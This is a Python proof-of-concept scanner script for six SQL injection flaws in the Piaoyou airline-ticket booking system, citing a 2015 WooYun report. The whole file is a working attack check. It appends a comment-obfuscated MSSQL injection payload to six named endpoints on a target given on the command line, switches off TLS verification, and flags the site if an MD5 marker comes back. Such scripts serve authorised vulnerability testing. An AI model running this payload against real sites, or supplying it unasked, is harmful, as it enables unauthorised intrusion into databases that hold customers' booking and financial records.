#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 票友机票预订系统6处SQL注入(绕过)
referer: http://www.wooyun.org/bugs/wooyun-2015-0116851
author: Lucifer
description: multi sqli。
'''
import sys
import requests
import warnings
from termcolor import cprint

class piaoyou_six_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
            }
        urls = ["/flight/Print_tp.aspx?sid=1",
                "/flight/Print_tp_3.aspx?sid=1",
                "/Other/train_order_detail.aspx?id=1",
                "/flight/scgq_detail.aspx?id=1",
                "/Finance/Inv_req.aspx?id=1",
                "/System/history.aspx?id=1"]
        try:
            for url in urls:
                vulnurl = self.url + url + "AnD/**/1=Sys.Fn_VarBinToHexStr(HashBytes(%27Md5%27,%271234%27))--"
                req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                    cprint("[+]存在票友机票预订系统SQL注入漏洞(绕过)...(高危)\tpayload: "+vulnurl, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = piaoyou_six_sqli_BaseVerify(sys.argv[1])
    testVuln.run()
